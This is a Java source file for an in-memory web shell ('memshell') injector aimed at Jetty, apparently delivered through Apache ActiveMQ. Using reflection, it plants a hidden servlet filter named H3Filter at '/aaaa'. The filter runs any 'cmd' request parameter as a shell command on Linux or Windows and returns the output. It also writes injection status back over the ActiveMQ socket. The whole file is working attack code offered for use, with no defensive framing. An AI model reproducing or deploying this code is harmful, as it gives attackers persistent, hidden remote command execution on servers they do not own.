import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.util.EnumSet;
import java.util.Scanner;

public class MemshellInject1 implements Filter {
    private static String filterName = "H3Filter";
    private static String url = "/aaaa";

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        HttpServletRequest req = (HttpServletRequest) servletRequest;
        servletResponse.getWriter().write("test");
        if (req.getParameter("cmd") != null) {
            boolean isLinux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[] {"sh", "-c", req.getParameter("cmd")} : new String[] {"cmd.exe", "/c", req.getParameter("cmd")};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner( in ).useDelimiter("\\a");
            String output = s.hasNext() ? s.next() : "";
            servletResponse.getWriter().write(output);
            servletResponse.getWriter().flush();

        }else{
            filterChain.doFilter(servletRequest, servletResponse);
        }
    }

    @Override
    public void destroy() {

    }

    public Object ClassGetField(String fieldName, Object o) throws NoSuchFieldException, IllegalAccessException {
        Field f;
        try {
            f = o.getClass().getDeclaredField(fieldName);
        } catch (NoSuchFieldException e) {
            try{
                f = o.getClass().getSuperclass().getDeclaredField(fieldName);
            }catch (Exception e1){
                f = o.getClass().getSuperclass().getSuperclass().getDeclaredField(fieldName);
            }
        }
        f.setAccessible(true);
        return f.get(o);

    }


    public void returnState(String result){
        try {
            Thread thread = Thread.currentThread();
            Class<?> aClass = Class.forName("java.lang.Thread");
            Field target = aClass.getDeclaredField("target");
            target.setAccessible(true);
            org.apache.activemq.transport.tcp.TcpTransport transport = (org.apache.activemq.transport.tcp.TcpTransport)target.get(thread);
            Class<?> aClass1 = Class.forName("org.apache.activemq.transport.tcp.TcpTransport");
            Field socketfield = aClass1.getDeclaredField("socket");
            socketfield.setAccessible(true);
            java.net.Socket socket =(java.net.Socket) socketfield.get(transport);
            OutputStream outputStream = socket.getOutputStream();
            outputStream.write("\n".getBytes());
            outputStream.write(result.getBytes());
            outputStream.close();
        }catch (Exception e){

        }
    }

    public void test1() {

        try {
            //反射获取线程属性group Thread.currentThread().getThreadGroup() 也行
            Thread rootThread = Thread.currentThread();
            Class<?> rootThreadClass = Class.forName("java.lang.Thread");
            Field groupField = rootThreadClass.getDeclaredField("group");
            groupField.setAccessible(true);
            ThreadGroup group = (ThreadGroup) groupField.get(rootThread);
            //反射获取ThreadGroup的属性 thread[]
            Field threadsArrayField = group.getClass().getDeclaredField("threads");
            threadsArrayField.setAccessible(true);
            Thread[] threads = (Thread []) threadsArrayField.get(group);
            for (Thread thread : threads){
                if (thread.getName().contains("Session-Scheduler")){
                    Object ContextObject = ClassGetField("_context",thread.getContextClassLoader());
                    Object servletHandlerObject = ClassGetField("_servletHandler", ContextObject);
                    boolean flag = false;
                    Object[] filters = (Object[]) ClassGetField("_filters", servletHandlerObject);
                    for(Object f:filters){
                        Field fieldName = f.getClass().getSuperclass().getDeclaredField("_name");
                        fieldName.setAccessible(true);
                        String name = (String) fieldName.get(f);
                        if(name.equals(filterName)){
                            flag = true;
                            break;
                        }
                    }
                    if(flag){
                        returnState("[-] Filter " + filterName + " exists.");
                        return;
                    }

                    Class sourceClazz = null;
                    Object holder = null;
                    Field modifiers = Field.class.getDeclaredField("modifiers");
                    modifiers.setAccessible(true);
                    ClassLoader classLoader = servletHandlerObject.getClass().getClassLoader();
                    try {
                        sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.Source");
                        Field field = sourceClazz.getDeclaredField("JAVAX_API");
                        modifiers.setInt(field, field.getModifiers() & ~Modifier.FINAL);
                        java.lang.reflect.Method method = servletHandlerObject.getClass().getMethod("newFilterHolder", sourceClazz);
                        holder = method.invoke(servletHandlerObject, field.get(null));
                    } catch (ClassNotFoundException e) {
                        sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.BaseHolder$Source");
                        java.lang.reflect.Method method = servletHandlerObject.getClass().getMethod("newFilterHolder", sourceClazz);
                        holder = method.invoke(servletHandlerObject, Enum.valueOf(sourceClazz, "JAVAX_API"));
                    }

                    MemshellInject1 memshellInject1 = new MemshellInject1();

                    java.lang.reflect.Method setName = holder.getClass().getSuperclass().getDeclaredMethod("setName",String.class);
                    setName.setAccessible(true);
                    setName.invoke(holder,filterName);

                    java.lang.reflect.Method setFilter = holder.getClass().getDeclaredMethod("setFilter",Filter.class);
                    setFilter.setAccessible(true);
                    setFilter.invoke(holder,memshellInject1);
                    servletHandlerObject.getClass().getMethod("addFilter", holder.getClass()).invoke(servletHandlerObject, holder);


                    java.lang.reflect.Constructor constructor = servletHandlerObject.getClass().getClassLoader().loadClass("org.eclipse.jetty.servlet.FilterMapping").getDeclaredConstructor();
                    constructor.setAccessible(true);
                    Object filterMapping = constructor.newInstance();

                    java.lang.reflect.Method setFilterName = filterMapping.getClass().getDeclaredMethod("setFilterName",String.class);
                    setFilterName.setAccessible(true);
                    setFilterName.invoke(filterMapping,filterName);
                    java.lang.reflect.Method setFilterHolder = filterMapping.getClass().getDeclaredMethod("setFilterHolder",holder.getClass());
                    setFilterHolder.setAccessible(true);
                    setFilterHolder.invoke(filterMapping,holder);
                    String pathSpecs = url;

                    java.lang.reflect.Method setPathSpec = filterMapping.getClass().getDeclaredMethod("setPathSpec",String.class);
                    setPathSpec.setAccessible(true);
                    setPathSpec.invoke(filterMapping,pathSpecs);

                    filterMapping.getClass().getMethod("setDispatcherTypes", EnumSet.class).invoke(filterMapping, EnumSet.of(DispatcherType.REQUEST));
                    servletHandlerObject.getClass().getMethod("prependFilterMapping", filterMapping.getClass()).invoke(servletHandlerObject, filterMapping);
                    returnState("[*]memshell Inject successfully!");
                    break;
                }
            }
        } catch (Exception e) {
            returnState("[-]Memshell Inject Failed... :" + e.getMessage());
        }
    }

}

